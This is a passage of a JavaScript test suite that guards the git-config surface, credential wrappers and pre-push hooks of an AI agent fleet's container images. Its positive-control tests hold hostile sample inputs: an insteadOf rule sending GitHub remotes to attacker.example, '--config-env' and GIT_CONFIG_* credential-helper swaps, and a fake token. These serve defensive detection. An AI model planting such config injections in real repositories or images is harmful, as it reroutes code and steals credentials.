      !new RegExp(`cat > "[^"]*/${name}" <<`).test(rendered),
      `the seed writes a ${name} wrapper onto the PVC again: it would be owned by uid 1000, the same uid every agent runs as, so the writer is the consumer (PEN-3713/PEN-3840)`,
    );
  }

  // Narrow on purpose: ${BASE}/.local/bin itself is NOT retired and this must
  // not assert that it is. The seed legitimately keeps recreating `claude` and
  // `codex` symlinks there, because the chat plugin hard-spawns
  // ${HOME}/.local/bin/<binary> by absolute path and the PVC mount hides the
  // image's baked copies under ${BASE}. What PEN-3840 retired is that
  // directory's place ON PATH and the GitHub wrappers that lived in it — which
  // is also why dropping it from PATH is safe for those two binaries: the
  // hard-spawn does not consult PATH, and a lookup by name still resolves them
  // at /usr/local/bin, which is not under ${BASE} and stays on PATH.
  assert.ok(
    !/\$\{LOCAL_BIN\}/.test(rendered),
    "the seed reintroduced a LOCAL_BIN GitHub wrapper directory (PEN-3840)",
  );

  // Positive control: the seed still runs and still writes the one PVC file
  // this change deliberately KEEPS — the PEN-3156 pre-push hook, which is not a
  // wrapper and not on PATH. Without this, a seed that stopped doing anything
  // at all would pass every assertion above.
  assert.match(
    rendered,
    /cat > "\$\{GIT_HOOKS_DIR\}\/pre-push" <<'EOF'/,
    "the seed no longer writes the pre-push hook; the assertions above would pass vacuously",
  );
});

test("the rendered github-mcp-server wrapper execs the scrub runtime inside the token wrapper", () => {
  const body = wrapperBody("github-mcp-server");

  const tokenAt = body.indexOf("paperclip-github-token-env");
  const runtimeAt = body.indexOf("github-mcp-egress-runtime.js");
  assert.notEqual(tokenAt, -1, "the MCP wrapper no longer injects the seat token");
  assert.notEqual(runtimeAt, -1, "the MCP wrapper no longer execs the egress scrub runtime");

  // Ordering is load-bearing in one direction only. The token wrapper must be
  // OUTERMOST so the real server still inherits GITHUB_PERSONAL_ACCESS_TOKEN;
  // putting the scrub outside it would start the server unauthenticated and
  // fail every tool call, which is the shape that gets a security control
  // reverted rather than fixed.
  assert.ok(runtimeAt > tokenAt, `scrub runtime must run inside the token wrapper: ${body}`);

  // The CLI runtime rewrites argv and the MCP runtime rewrites JSON-RPC frames;
  // they are not interchangeable. Pointing this wrapper at the CLI runtime
  // yields a process that starts, scrubs nothing, and looks plausible.
  assert.ok(
    !body.includes("github-cli-egress-runtime.js"),
    "the MCP wrapper must not exec the CLI runtime",
  );
});

test("the rendered MCP wrapper hands the real server to the scrub runtime as its target, with args after it", () => {
  // Execute the wrapper the chart actually renders, with each absolute path
  // replaced by a stub, so this fails if the exec chain is reordered — a
  // runtime that received `stdio` as its target and the server path as an
  // argument would still "run", and would scrub nothing.
  const base = fs.mkdtempSync(path.join(os.tmpdir(), "gh-mcp-egress-"));
  const stubs = path.join(base, "stubs");
  fs.mkdirSync(stubs, { recursive: true });

  const body = wrapperBody("github-mcp-server");
  const execLine = body.split("\n").find((line) => line.startsWith("exec "));
  assert.ok(execLine, `no exec line in the MCP wrapper: ${body}`);

  // Stand-ins, each preserving the real component's argv contract: token-env
  // and node both exec their remaining argv; the runtime reports what it got.
  const tokenEnv = writeExecutable(stubs, "token-env", '#!/bin/sh\nexec "$@"\n');
  const node = writeExecutable(stubs, "node", '#!/bin/sh\nexec "$@"\n');
  const runtime = writeExecutable(
    stubs,
    "runtime",
    '#!/bin/sh\nprintf "args=%s\\n" "$*"\n',
  );

  const rewritten = execLine
    .replace("/usr/local/libexec/paperclip/bin/paperclip-github-token-env", tokenEnv)
    .replace("/usr/local/bin/node", node)
    .replace(/\S*github-mcp-egress-runtime\.js/, runtime);

  // The rewrite must have consumed every path this host lacks, or the
  // assertions below would be testing a line that cannot run for the wrong
  // reason.
  assert.ok(
    !rewritten.includes("/usr/local/libexec/paperclip/bin/paperclip-github-token-env"),
    `token-env path not substituted: ${rewritten}`,
  );
  assert.ok(
    !rewritten.includes("github-mcp-egress-runtime.js"),
    `runtime path not substituted: ${rewritten}`,
  );

  // "$@" in the wrapper takes the mcp.json args; $0 is supplied separately.
  const result = spawnSync("/bin/sh", ["-c", rewritten, "sh", "stdio"], {
    encoding: "utf8",
  });
  assert.equal(result.status, 0, result.stderr);

  // The real server must be the runtime's target, with the mcp.json args after
  // it — which is the argv contract github-mcp-egress-runtime.js reads as
  // process.argv[2] (target) and slice(3) (args).
  assert.equal(
    result.stdout.trim(),
    "args=/usr/local/bin/github-mcp-server stdio",
    `unexpected argv threading: ${result.stdout}`,
  );
});


// --- The git-config surface the agent image ships (PEN-4541) ---------------
//
// Assertion (a) of PEN-4541: the surface AS DECLARED IN THIS REPO. Its pair,
// assertion (b), runs against the actually-built image in docker-agent.yml
// (`scripts/check-agent-image-git-config.mjs`) and catches what this one
// structurally cannot -- anything that writes /etc/gitconfig outside the
// declared lines, such as a SERVER_IMAGE/TOOLCHAIN_IMAGE base change or a
// vendored toolchain layer. Neither is sufficient alone; do not delete one as
// redundant with the other.
//
// ⛔ OUT OF SCOPE, stated here so a green run is not over-read: both
// assertions measure the artifact AT PRODUCTION -- the sources, and the image
// before it is promoted and rolled out. Neither covers mutation of an
// already-published image (a Harbor retag or overwrite of a tag that already
// passed this gate) or drift of an already-running pod. Registry-side
// immutability is a separate control and was deliberately NOT assigned with
// this work. If you want it, file it.
//
// Why these live here: this file already reads both artifacts the check needs,
// and already runs in the `Helm chart` verify lane. What it did NOT do is
// assert anything about the FLAGS -- see the C3 note in
// scripts/git-config-surface.mjs for why the existing IMAGE_WRAPPER_BIN count
// above passes unchanged while a fleet-wide remote rewrite is live.

test("every github wrapper passes exactly the git config flags it declares (PEN-4541)", () => {
  const dir = path.join(repoRoot, "docker/github-wrappers");

  // Enumerate the DIRECTORY, not a list written here. A hardcoded list is the
  // obvious way to write this and it silently omits the next wrapper somebody
  // adds -- which is the one most likely to be wrong. An undeclared file is a
  // failure, so adding a wrapper forces a declaration in
  // EXPECTED_WRAPPER_CONFIG_FLAGS and a human read of this comment.
  //
  // `.md` is excluded to match the Dockerfile's own `--exclude=*.md`: a doc
  // file is not installed and executes nothing.
  const shipped = fs
    .readdirSync(dir)
    .filter((name) => !name.endsWith(".md"))
    .sort();

  assert.deepEqual(
    shipped,
    [...EXPECTED_WRAPPER_CONFIG_FLAGS.keys()].sort(),
    "docker/github-wrappers/ gained or lost a wrapper: declare its exact `-c` flag set in EXPECTED_WRAPPER_CONFIG_FLAGS (scripts/git-config-surface.mjs) so it is covered, rather than leaving it unasserted",
  );

  for (const name of shipped) {
    const body = fs.readFileSync(path.join(dir, name), "utf8");

    // EQUALITY, deliberately, and this is the whole point of PEN-4541's
    // correction C3. The attack is an ADDED flag -- appending
    // `-c url.https://attacker.example/.insteadOf=https://github.com/` makes
    // every agent in the fleet rewrite its GitHub remotes -- and a superset or
    // `.includes()` check can only ever observe that the good flags are still
    // present. The order is part of the equality too: for `git`, the empty
    // value must clear the inherited helper BEFORE the paperclip helper is
    // named, or the clear wipes the helper it is meant to install.
    // `assert.ok`, not `assert.deepEqual`: a failing deepEqual appends its own
    // diff of the raw values, which would print a credential straight into a CI
    // log if one were ever planted in a flag. Same discipline as the image
    // checker; see redactCredentials in scripts/git-config-surface.mjs.
    const flags = configFlags(body);
    const expectedFlags = EXPECTED_WRAPPER_CONFIG_FLAGS.get(name);
    assert.ok(
      flags.length === expectedFlags.length &&
        flags.every((flag, index) => flag === expectedFlags[index]),
      `the ${name} wrapper's git config flags are not the declared set — an added or reordered -c flag changes what every agent in the fleet executes (PEN-4541 C3).\n  expected: ${JSON.stringify(expectedFlags)}\n  got:      ${JSON.stringify(redactCredentials(flags.join(" | ")))}`,
    );

    // Body-wide, not exec-line-scoped like the flags above, because this one
    // must hold wherever it is written: a rewrite rule is just as fleet-wide
    // if a future edit installs it with `git config` inside the wrapper rather
    // than as a `-c` flag.
    assert.deepEqual(
      insteadOfOccurrences(body),
      [],
      `the ${name} wrapper names an insteadOf rule: that silently reroutes every GitHub URL in every repo on every agent, away from the credential helper this wrapper exists to install`,
    );

    // The argv-free equivalent of `-c`, which a flag-set equality cannot see.
    // GIT_CONFIG_COUNT/KEY_n/VALUE_n injects config with exactly the force of
    // a `-c` flag, and GIT_CONFIG_GLOBAL/SYSTEM repoints a whole scope at an
    // attacker-chosen file.
    assert.equal(
      configInjectionEnv(body),
      null,
      `the ${name} wrapper sets a GIT_CONFIG* variable, which injects git config as forcefully as a -c flag and is invisible to the flag-set equality above`,
    );

    assert.equal(
      residualSecrets(body),
      0,
      `the ${name} wrapper carries a credential-bearing URL — these files are installed world-readable at 0755 into every agent image`,
    );
  }

  // C1/C2 restated as its own assertion rather than left implicit in the
  // equality above, because this is the half PEN-4538 originally pointed at
  // the WRONG FILE. The paperclip credential helper is NOT in /etc/gitconfig
  // -- that scope carries the `gh` helper -- it arrives on git's `command
  // line:` scope from this wrapper. A check written against /etc/gitconfig
  // pins the gh helper and says nothing at all about this one.
  assert.equal(
    configFlags(fs.readFileSync(path.join(dir, "git"), "utf8")).at(-1),
    `credential.https://github.com.helper=${IMAGE_WRAPPER_BIN}/github-token-credential-helper`,
    "the git wrapper no longer installs the paperclip credential helper; git treats an absent helper as a silent fallthrough, not an error",
  );
});

test("the agent image's build chain writes exactly one system git config (PEN-4541)", () => {
  // All four Dockerfiles in the agent image's chain, not just the one that
  // currently writes: the risk this assertion exists for is a SECOND write
  // appearing, and only Dockerfile.runtime having one today is the thing being
  // asserted, not an assumption that lets the others go unread.
  const chain = [
    "Dockerfile",
    "Dockerfile.runtime",
    "Dockerfile.agent-toolchain",
    "Dockerfile.agent",
  ];

  const invocations = [];
  for (const name of chain) {
    const body = fs.readFileSync(path.join(repoRoot, name), "utf8");
    for (const invocation of dockerfileGitConfigInvocations(body)) {
      invocations.push(`${name}: ${invocation}`);
    }

    // A `git config` invocation is not the only way to write the system scope
    // -- an `echo >> /etc/gitconfig` or a COPY over it reaches the same file
    // and would be invisible to the list above. Comments are stripped first,
    // so the explanatory prose in Dockerfile.runtime (and the pointer to this
    // test) does not trip it.
    const executable = body
      .split("\n")
      .filter((line) => !/^\s*#/.test(line))
      .join("\n");
    assert.ok(
      !executable.includes("/etc/gitconfig"),
      `${name} names /etc/gitconfig outside a comment: the system scope is written once, by \`git config --system\` in Dockerfile.runtime, and a second writer is exactly what assertion (b) exists to catch in the built image`,
    );
    assert.equal(
      configInjectionEnv(executable),
      null,
      `${name} sets a GIT_CONFIG* variable, which redirects or injects the config scope this gate measures`,
    );
  }

  assert.deepEqual(
    invocations,
    [`Dockerfile.runtime: ${EXPECTED_DOCKERFILE_GIT_CONFIG}`],
    "the agent image's build chain no longer writes exactly one git config line — a second line, a changed helper, or an insteadOf rule here lands in /etc/gitconfig on every agent (PEN-4541)",
  );

  // Equality above already forbids them; these two name the specific shapes so
  // a failure reads as the finding it is rather than as a diff.
  const runtime = fs.readFileSync(path.join(repoRoot, "Dockerfile.runtime"), "utf8");
  assert.deepEqual(
    insteadOfOccurrences(runtime),
    [],
    "Dockerfile.runtime names an insteadOf rule: planted in the system scope it reroutes every GitHub URL on every agent",
  );
  assert.equal(
    residualSecrets(runtime),
    0,
    "Dockerfile.runtime carries a credential-bearing URL, which would be baked into every agent image at rest",
  );
});

// The join between the two assertions. (a) pins the Dockerfile LINE and (b)
// pins the FILE that line produces, and nothing else forces those two
// expectations to describe the same thing -- edit one and the other goes on
// asserting the old surface, with both staying green, which is the quiet way a
// pair of checks becomes one check.
//
// So derive it: run the declared command and compare the bytes. This is also
// where the 77-byte figure measured on PEN-4541 comes from, rather than being
// restated from the issue.
test("the declared Dockerfile line produces the declared /etc/gitconfig (PEN-4541)", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pen4541-"));
  try {
    const file = path.join(dir, "gitconfig");
    // GIT_CONFIG_SYSTEM redirects `--system` at a file we own, so the real
    // command runs unmodified. (The wrappers and Dockerfiles are forbidden
    // from setting this variable, for the reason in configInjectionEnv; a test
    // using it deliberately to sandbox a write is the opposite case.)
    execFileSync("/bin/sh", ["-c", EXPECTED_DOCKERFILE_GIT_CONFIG], {
      env: { ...process.env, GIT_CONFIG_SYSTEM: file },
    });
    assert.equal(
      fs.readFileSync(file, "utf8"),
      EXPECTED_SYSTEM_GITCONFIG,
      "the git config line Dockerfile.runtime runs does not produce the file scripts/check-agent-image-git-config.mjs expects to find in the built image — the source-level and image-level assertions have drifted apart and are no longer describing one surface. If neither expectation changed, compare this runner's git against the image's: this asserts git's config-writing format, which is stable but not a promise.",
    );
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// POSITIVE CONTROLS. PEN-4541 makes these a requirement rather than a courtesy,
// and the reason generalises: a check that reads the wrong thing, or whose
// predicate never matches, passes trivially and FOREVER. Nothing about a green
// run distinguishes "the surface is clean" from "the detector is dead".
//
// So each predicate above is driven here against input that must RED it. These
// are pure-function cases on synthetic text -- they touch no repo file, so they
// cannot be satisfied by the real artifacts happening to be clean, which is the
// failure mode they exist to exclude.
//
// Assertion (b)'s positive controls cannot be written here, because the thing
// they must prove is about an image. They live in docker-agent.yml, where a
// one-layer image derived FROM the agent image carries each mutation and the
// checker must go red on it.
test("the git-config surface predicates actually fire (PEN-4541 positive controls)", () => {
  const clean = fs.readFileSync(
    path.join(repoRoot, "docker/github-wrappers/git"),
    "utf8",
  );
  // The benign shape measured on the PVC: an SSH-style bare username, which
  // MIN_BARE_SECRET_LEN exists to tell apart from a credential. Assembled like
  // every other URL here — see credentialedUrl for why none of these is a
  // literal.
  const BENIGN_SSH_STYLE_URL = credentialedUrl({
    user: "git",
    path: "/Blockcast/paperclip.git",
  });

  // Control 1 -- correction C3, reproduced exactly. Append the rewrite flag to
  // the real wrapper and assert BOTH that the flag-set equality reds AND that
  // the existing IMAGE_WRAPPER_BIN count does not: if the count ever starts
  // catching this, the two assertions have been conflated and this comment is
  // wrong.
  const poisoned = clean.replace(
    '  "$@"',
    '  -c url.https://attacker.example/.insteadOf=https://github.com/ \\\n  "$@"',
  );
  assert.notEqual(poisoned, clean, "the C3 control did not modify the wrapper — re-point it");
  assert.notDeepEqual(
    configFlags(poisoned),
    EXPECTED_WRAPPER_CONFIG_FLAGS.get("git"),
    "the flag-set equality did not notice an added insteadOf -c flag: this is PEN-4541 C3 and it is the whole reason this assertion is an equality",
  );
  assert.equal(
    poisoned.split(IMAGE_WRAPPER_BIN).length - 1,
    2,
    "the pre-existing path-count guard was expected to stay green on this input — it counts a path, not a flag set (PEN-3748 vs PEN-4541)",
  );
  assert.equal(
    insteadOfOccurrences(poisoned).length,
    1,
    "the control expects exactly one planted rule — if this reads 2, the real wrapper it builds on is already poisoned and the assertion above is the one to read",
  );

  // Control 1b -- the SAME attack in git's other argv spelling, and the more
  // dangerous payload. `--config-env=<key>=<ENVVAR>` (git >= 2.31) takes the
  // value from an environment variable, so the injected config never appears
  // in the exec line at all.
  //
  // This shipped undetected at b70c7aae and was caught in review: `configFlags`
  // read only `-c`, so the equality stayed green on a wrapper that installs an
  // attacker's CREDENTIAL HELPER -- not a URL rewrite. That distinction is why
  // this control asserts the insteadOf scan does NOT fire: a helper swap names
  // no insteadOf, so the body-wide scan above is no backstop here and the
  // equality is the only thing standing between this mutation and every agent
  // in the fleet. Measured against git 2.47.3: both spellings add the injected
  // helper to `git config --get-all credential.https://github.com.helper`.
  //
  // BOTH spellings, because git accepts the value attached or separated and
  // only the attached one was named in review. The separated form is an
  // ordinary parse-options string argument, not an exotic shape.
  for (const [spelling, flag] of [
    ["attached", "--config-env=credential.https://github.com.helper=EVIL"],
    ["separated", "--config-env credential.https://github.com.helper=EVIL"],
  ]) {
    const swapped = clean.replace('  "$@"', `  ${flag} \\
  "$@"`);
    assert.notEqual(swapped, clean, `the ${spelling} --config-env control did not modify the wrapper — re-point it`);
    assert.notDeepEqual(
      configFlags(swapped),
      EXPECTED_WRAPPER_CONFIG_FLAGS.get("git"),
      `the flag-set equality did not notice a --config-env credential-helper swap (${spelling} spelling): it injects config with exactly the force of -c and is invisible to a check that reads only -c`,
    );
    assert.deepEqual(
      insteadOfOccurrences(swapped),
      [],
      `the ${spelling} --config-env control is supposed to name no insteadOf — if it does, it is no longer proving that the equality catches what the insteadOf scan cannot`,
    );
    assert.equal(
      swapped.split(IMAGE_WRAPPER_BIN).length - 1,
      2,
      "the pre-existing path-count guard was expected to stay green on this input — it counts a path, not a flag set (PEN-3748 vs PEN-4541)",
    );
  }

  // Control 2 -- casing. `git` matches config keys case-insensitively, so a
  // case-sensitive scan is defeated by typing the rule differently.
  for (const spelling of ["insteadOf", "insteadof", "INSTEADOF", "InsteadOf"]) {
    assert.equal(
      insteadOfOccurrences(`[url "https://x/"]\n\t${spelling} = https://github.com/\n`).length,
      1,
      `the insteadOf scan missed the ${spelling} spelling, which git honours`,
    );
  }

  // Control 3 -- the credential predicate, on the shape PEN-4541 names
  // specifically: a token in a URL SECTION NAME, which is where the 2026-10-19
  // token at rest actually sat (PEN-4330). This is the case an implementation
  // anchored to `url = ` / `remote = ` keys would silently miss.
  const token = `ghs_${"A".repeat(36)}`;
  assert.equal(
    residualSecrets(`[url "${credentialedUrl({ secret: token })}"]\n\tinsteadOf = https://github.com/\n`),
    1,
    "residualSecrets missed a credential in a URL section name — the predicate must not be anchored to a config key",
  );
  assert.equal(
    residualSecrets(
      `[credential]\n\thelper = store --file=${credentialedUrl({ user: token, host: "example" })}\n`,
    ),
    1,
    "residualSecrets missed a bare long-token credential outside a url key",
  );
  // ...and its negative half. A predicate that matches everything is as dead as
  // one that matches nothing, and this is the exact benign shape measured on
  // the PVC.
  assert.equal(
    residualSecrets(EXPECTED_SYSTEM_GITCONFIG),
    0,
    "residualSecrets flags the real system gitconfig — it would red every build and be switched off",
  );
  assert.equal(
    residualSecrets(
      `[remote "origin"]\n\turl = ${BENIGN_SSH_STYLE_URL}\n`,
    ),
    0,
    "residualSecrets flags an SSH-style username as a secret; MIN_BARE_SECRET_LEN exists to tell those apart",
  );
  assert.equal(
    residualSecrets(credentialedUrl({ user: "user", secret: "" })),
    0,
    "an empty secret after the colon is not a credential (parity with scrubber.py's partition)",
  );

  // Control 3b -- the redaction that every failure message in both consumers
  // depends on. A control for credentials at rest whose own failure output
  // copies the credential into a CI log has moved the exposure, not closed it;
  // the first cut of the image checker did exactly that and its own control
  // caught it. The lossy direction is deliberate and is why nothing ever
  // COMPARES redacted text -- see redactCredentials.
  assert.equal(
    redactCredentials(`[url "${credentialedUrl({ secret: token })}"]`),
    `[url "${credentialedUrl({ user: "<redacted>", secret: undefined })}"]`,
  );
  assert.ok(
    !redactCredentials(
      `url = ${credentialedUrl({ user: token, path: "/o/r.git" })}`,
    ).includes(token),
    "redactCredentials left a bare long-token credential in text bound for a CI log",
  );
  assert.equal(
    redactCredentials(EXPECTED_SYSTEM_GITCONFIG),
    EXPECTED_SYSTEM_GITCONFIG,
    "redactCredentials rewrote a clean config — a redactor that mangles benign output makes every real finding harder to read",
  );
  assert.equal(
    redactCredentials(BENIGN_SSH_STYLE_URL),
    BENIGN_SSH_STYLE_URL,
    "redactCredentials redacted an SSH-style username, which is not a credential",
  );

  // Control 4 -- the argv-free injection path.
  //
  // GIT_CONFIG_PARAMETERS is first in the list because it is the one the
  // enumerated regex at b70c7aae MISSED: the pattern ended in `\b`, which
  // cannot sit between `GIT_CONFIG` and `_PARAMETERS`, so the scan returned
  // null on git's own documented carrier for `-c` values while honouring every
  // name somebody had thought to list. The predicate is now a prefix match, and
  // every enumerated name below is kept as its regression proof -- widening a
  // pattern is exactly the edit that silently stops matching what it used to.
  for (const shape of [
    'GIT_CONFIG_PARAMETERS="\'credential.https://github.com.helper\'=\'!evil\'" exec "$@"',
    'export GIT_CONFIG_PARAMETERS\nexec "$@"',
    'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://attacker/.insteadOf exec "$@"',
    'GIT_CONFIG_VALUE_0=https://github.com/ exec "$@"',
    'export GIT_CONFIG_GLOBAL=/paperclip/.gitconfig\nexec "$@"',
    'GIT_CONFIG_SYSTEM=/tmp/x exec "$@"',
    'GIT_CONFIG_NOSYSTEM=1 exec "$@"',
    'GIT_CONFIG=/tmp/x exec "$@"',
  ]) {
    assert.notEqual(
      configInjectionEnv(shape),
      null,
      `the GIT_CONFIG* scan missed ${shape.split("\n")[0]}, which injects config as forcefully as a -c flag`,
    );
  }
  assert.equal(
    configInjectionEnv(clean),
    null,
    "the GIT_CONFIG* scan flags the real wrapper — it would red every build",
  );

  // Control 5 -- the Dockerfile reader. A second `git config` line, and a
  // continuation-joined one, must both be seen; the real file uses a
  // continuation, so a reader that did not join them would return nothing and
  // the equality would be vacuously satisfied by an empty list.
  const twoLines =
    "RUN git config --system credential.helper x \\\n  && git config --system url.https://attacker/.insteadOf https://github.com/\n";
  assert.equal(
    dockerfileGitConfigInvocations(twoLines).length,
    1,
    "a `&&`-chained second git config must stay on one logical line for the equality to see it",
  );
  assert.ok(
    dockerfileGitConfigInvocations(twoLines)[0].includes("insteadOf"),
    "the Dockerfile reader dropped the second, chained git config invocation",
  );
  assert.deepEqual(
    dockerfileGitConfigInvocations("# RUN git config --system x.y z\n"),
    [],
    "the Dockerfile reader counts a commented-out line, so the prose around the real one would fail the equality",
  );

  // Control 5b -- `git config` is not the only way to spell a system-scope
  // write. Global options sit BETWEEN the binary and the subcommand, so
  // `git -C / config --system ...` and `git --no-pager config --system ...`
  // write the same scope with the same force while defeating a literal
  // `indexOf("git config")` scan (Ally review at b70c7aae, Suggestion 1).
  for (const line of [
    "RUN git -C / config --system url.https://attacker/.insteadOf https://github.com/",
    "RUN git --no-pager config --system http.sslVerify false",
    "RUN git --git-dir=/tmp/x config --system credential.helper evil",
  ]) {
    assert.equal(
      dockerfileGitConfigInvocations(line).length,
      1,
      `the Dockerfile reader missed a global-option spelling, which writes the system scope just as forcefully: ${line}`,
    );
  }
  // ...and the negative half, which is the one a widened pattern breaks: the
  // match must still START at `git`, or every invocation it returns differs
  // from EXPECTED_DOCKERFILE_GIT_CONFIG and the equality reds on a clean tree.
  assert.deepEqual(
    dockerfileGitConfigInvocations(
      "RUN git config --system credential.https://github.com.helper '!/usr/bin/gh auth git-credential'\n",
    ),
    [EXPECTED_DOCKERFILE_GIT_CONFIG],
    "the widened Dockerfile reader no longer returns the real line verbatim — the equality would red on a clean tree, which is the way a guard gets switched off",
  );
  // A `git` that never reaches a `config` subcommand is not a config write.
  assert.deepEqual(
    dockerfileGitConfigInvocations("RUN git clone https://github.com/o/r.git /tmp/r\n"),
    [],
    "the widened Dockerfile reader reports an ordinary git command as a config write",
  );
});

// ---------------------------------------------------------------------------
// PEN-4932 stage 3b-i: the pre-push publish guard now ships in the image too.
//
// `docker/github-hooks/pre-push` and the chart seed's heredoc are the SAME
// launcher written twice, and they will coexist for the whole of the staged
// rollout (ship the file -> measure images -> repoint the runtime -> drop the
// seed). Two copies of a security control with nothing comparing them is
// exactly the shape PEN-4518 was: four consumers all individually correct,
// nothing owning the join, 2h17m of fleet-wide push failure.
//
// So the join is a test. While both exist they must be byte-identical.
// ---------------------------------------------------------------------------

// Restated here for the same reason as IMAGE_WRAPPER_BIN above: this value must
// agree with the Dockerfile COPY target and Dockerfile.agent's COPY --from, and
// a test deriving it from one of them could not catch the other drifting.
const IMAGE_HOOKS_DIR = "/usr/local/libexec/paperclip/hooks";
const HOOK_SOURCE_PATH = "docker/github-hooks/pre-push";

test("the directory the runtime reads is the directory the images write", () => {
  // PEN-4932's join, and the one that can take the fleet down: `hooksDirectory()`
  // returns BAKED_HOOKS_DIR, and nothing but this test says that string is the
  // same one the two Dockerfiles COPY to. If they part, every pod refuses every
  // push — the runtime fails closed on a missing hook (PEN-4518, BLO-48361), so
  // the cost of the drift is a fleet-wide publishing outage, not a silent one.
  //
  // `IMAGE_HOOKS_DIR` is deliberately a literal restated near the Dockerfile
  // assertions (see the comment on its declaration); this reads the TypeScript
  // side out of source for the same reason the seed join does — a test holding
  // both ends of an equality as literals cannot observe either end move.
  const pathSource = fs.readFileSync(
    path.join(repoRoot, "packages/adapter-utils/src/github-git-hooks-path.ts"),
    "utf8",
  );
  const declaredBaked = pathSource.match(/BAKED_HOOKS_DIR\s*=\s*"([^"]+)"/);
  assert.ok(
    declaredBaked,
    "could not read BAKED_HOOKS_DIR from github-git-hooks-path.ts — keep it a plain `= \"literal\"` a regex can read, as the header of that file asks",
  );
  assert.equal(
    declaredBaked[1],
    IMAGE_HOOKS_DIR,
    "the egress runtime reads a hooks directory the agent image does not write — every push in the fleet would be refused",
  );
});

/** The hook body the chart seed writes, dedented the way the YAML parser will.
 *
 *  The rendered template still carries the block scalar's indentation as TEXT;
 *  it is the parse that strips it. Stripping exactly the `cat >` line's own
 *  indent reproduces that, and is why the shebang reaches the shell at column
 *  0 rather than as ` #!/bin/sh`, which would not be a shebang at all. */
function seededPrePushBody(rendered) {
  const lines = rendered.split("\n");
  const start = lines.findIndex((line) =>
    /^\s*cat > "\$\{GIT_HOOKS_DIR\}\/pre-push" <<'EOF'$/.test(line),
  );
  assert.notEqual(
    start,
    -1,
    "the chart no longer seeds a pre-push hook by heredoc. If the seed was removed deliberately (stage 3b-iii), remove this test with it; if it was merely reworded, this join is now blind and must be re-pointed.",
  );
  const indent = /^(\s*)/.exec(lines[start])[1];
  const body = [];
  for (let i = start + 1; i < lines.length; i += 1) {
    if (lines[i] === `${indent}EOF`) {
      return `${body.join("\n")}\n`;
    }
    assert.ok(
      lines[i].startsWith(indent),
      `heredoc line ${i + 1} is indented less than its opener, so the block scalar does not dedent the way this test assumes: ${JSON.stringify(lines[i])}`,
    );
    body.push(lines[i].slice(indent.length));
  }
  assert.fail("the pre-push heredoc is never terminated by EOF in the rendered chart");
}

test("the image hook and the chart seed carry the same publish guard (PEN-4932)", () => {
  const rendered = render("templates/statefulset.yaml");
  const seeded = seededPrePushBody(rendered);
  const baked = fs.readFileSync(path.join(repoRoot, HOOK_SOURCE_PATH), "utf8");

  assert.equal(
    baked,
    seeded,
    `${HOOK_SOURCE_PATH} and the chart seed's heredoc have drifted. These are the same PEN-3156 launcher written twice and both are live during the stage 3b rollout, so a difference means some agents scrub through one body and some through the other.`,
  );

  // The property that makes it a hook at all, asserted on the shared value so
  // it cannot pass by both copies being equally broken.
  assert.ok(
    seeded.startsWith("#!/bin/sh\n"),
    "the publish guard launcher lost its shebang, so git would execute it under whatever interpreter it guessed",
  );
  assert.match(
    seeded,
    /--pre-push-hook "\$@"\n$/,
    "the launcher no longer forwards git's hook arguments to the egress runtime, which reads the ref updates it is meant to scan from them",
  );
});

test("the pre-push hook ships root-owned and executable in both images (PEN-4932)", () => {
  // Mode, from git rather than the worktree: a checkout can lose +x to umask,
  // but what ships is what git records. `COPY --chmod=0755` would mask a
  // non-executable source here, so this guards the source of truth staying
  // runnable for anyone who uses it outside the image.
  const mode = execFileSync("git", ["ls-files", "-s", "--", HOOK_SOURCE_PATH], {
    cwd: repoRoot,
    encoding: "utf8",
  }).trim();
  assert.match(
    mode,
    /^100755 /,
    `${HOOK_SOURCE_PATH} is not tracked executable (got: ${mode || "untracked"})`,
  );

  const dockerfile = fs.readFileSync(path.join(repoRoot, "Dockerfile"), "utf8");
  const agentDockerfile = fs.readFileSync(path.join(repoRoot, "Dockerfile.agent"), "utf8");

  // No `--chown`: that is the security property, not an omission. On the PVC
  // this launcher is agent-writable and the chart cannot help it (its seed runs
  // as uid 1000 against an fsGroup-1000 volume). Root-owned in the image is the
  // whole reason baking it is an improvement and not just a relocation, so a
  // `--chown=node:node` added here later would quietly undo it.
  assert.ok(
    dockerfile.includes(
      `COPY --chmod=0755 --exclude=*.md docker/github-hooks/ ${IMAGE_HOOKS_DIR}/`,
    ),
    `the server image no longer installs docker/github-hooks/ to ${IMAGE_HOOKS_DIR} with --chmod=0755 and --exclude=*.md. The exclude is load-bearing: everything in that directory installs 0755, so a README added later would ship executable.`,
  );
  assert.ok(
    !/COPY\s+--chown=\S+\s+--chmod=0755\s+--exclude=\*\.md\s+docker\/github-hooks\//.test(
      dockerfile,
    ),
    "the hook directory is installed with --chown, which hands uid 1000 the ability to rewrite the launcher of the guard that constrains it (PEN-3715)",
  );
  assert.ok(
    agentDockerfile.includes(`COPY --from=server ${IMAGE_HOOKS_DIR} ${IMAGE_HOOKS_DIR}`),
    `Dockerfile.agent does not take ${IMAGE_HOOKS_DIR} from the server image. Re-copying it from the build context instead would let the two images carry different bodies of the same guard, which is the drift PEN-3713 removed for the wrappers.`,
  );
});

test("the image build asserts the baked guard, not only this test suite (PEN-4932)", () => {
  // The two tests above pin the COPY lines by text. That catches a Dockerfile
  // edited wrongly; it cannot catch an image built WRONGLY — a `--from` stage
  // resolving to a stale server image, a later layer shadowing the path, a
  // cache artefact. Two different checks close that on the two different
  // images, and both are worth pinning for the same reason the COPY lines are:
  // deleting either is a one-line edit whose consequence is invisible until a
  // push fails somewhere else. What the consumer does on a bad image is the
  // reason that matters — `runGitEgressRuntime` REFUSES a publish when it
  // finds no executable pre-push where it looks, so a wrong image does not
  // degrade, it stops every push in the fleet once stage 3b-ii repoints the
  // runtime here.
  const serverDockerfile = fs.readFileSync(path.join(repoRoot, "Dockerfile"), "utf8");
  const agentDockerfile = fs.readFileSync(path.join(repoRoot, "Dockerfile.agent"), "utf8");

  // (1) The SERVER image proves the BAKE, at build time, where it is cheapest.
  assert.ok(
    serverDockerfile.includes(`hooks=${IMAGE_HOOKS_DIR};`),
    `Dockerfile no longer runs a build-time check over ${IMAGE_HOOKS_DIR}. Without it the only evidence that the publish guard baked is a one-off manual read of one pod.`,
  );
  assert.ok(
    serverDockerfile.includes('test -f "$hooks/pre-push"'),
    "Dockerfile's build-time check no longer asserts the launcher EXISTS. The find below it passes vacuously over an empty directory, which is exactly what a mistyped --exclude glob produces.",
  );
  assert.ok(
